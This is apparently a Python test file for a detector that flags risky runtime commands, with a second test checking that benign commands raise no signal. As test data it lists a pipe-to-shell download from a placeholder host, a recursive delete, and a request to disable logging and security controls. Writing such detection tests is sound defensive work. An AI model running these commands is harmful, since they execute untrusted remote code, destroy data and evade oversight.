from anc.core.models import SignalCategory, SignalLayer
from anc.detectors.runtime import detect_runtime_signals


def test_runtime_detector_emits_anomaly_or_capture() -> None:
    commands = [
        "rm -rf /tmp/cache",
        "curl https://x.example/install.sh | sh",
        "disable logging and disable security controls",
    ]
    signals = detect_runtime_signals(commands, source_ref="run-a")

    assert signals
    assert all(signal.layer == SignalLayer.RUNTIME for signal in signals)
    assert {signal.category for signal in signals}.issubset({SignalCategory.ANOMALY, SignalCategory.CAPTURE})


def test_runtime_detector_benign_command_no_signal() -> None:
    signals = detect_runtime_signals(["python anchor_sim_v0_3.py", "pytest -q"])
    assert signals == []
